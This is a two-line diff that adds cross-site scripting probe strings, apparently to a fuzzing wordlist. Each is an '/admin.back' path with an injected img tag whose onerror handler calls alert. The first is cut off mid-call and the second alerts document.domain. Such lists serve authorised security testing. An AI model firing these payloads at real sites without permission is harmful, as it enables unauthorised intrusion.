@@ -1,0 +1,2 @@
+/admin.back<img src=a onerror=alert(
+/admin.back<img%20src=x%20onerror=alert(document.domain)>
